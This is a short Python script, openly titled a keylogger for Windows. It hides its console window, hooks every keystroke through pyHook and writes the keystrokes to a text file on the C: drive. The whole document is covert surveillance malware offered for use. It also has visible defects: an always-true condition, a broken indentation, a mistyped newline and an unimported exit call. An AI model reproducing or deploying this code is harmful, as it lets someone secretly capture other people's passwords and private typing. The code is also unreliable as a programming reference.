# Python code for keylogger
# to be used in windows
# requires Python to be installed.
import win32api
import win32console
import win32gui
import pythoncom, pyHook
  
win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)
  
def OnKeyboardEvent(event):
    if event.Ascii==5:
        _exit(1)
    if event.Ascii !=0 or 8:
    #open output.txt to read current keystrokes
        file = open('c:\output.txt', 'r+')
        buffer = file.read()
        file.close()
    # open output.txt to write current + new keystrokes
        file = open('c:\output.txt', 'w')
        keylogs = chr(event.Ascii)
        if event.Ascii == 13:
        keylogs = '/n'
        buffer += keylogs
        file.write(buffer)
        file.close()
# create a hook manager object
hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
# set the hook
hm.HookKeyboard()
# wait forever
pythoncom.PumpMessages()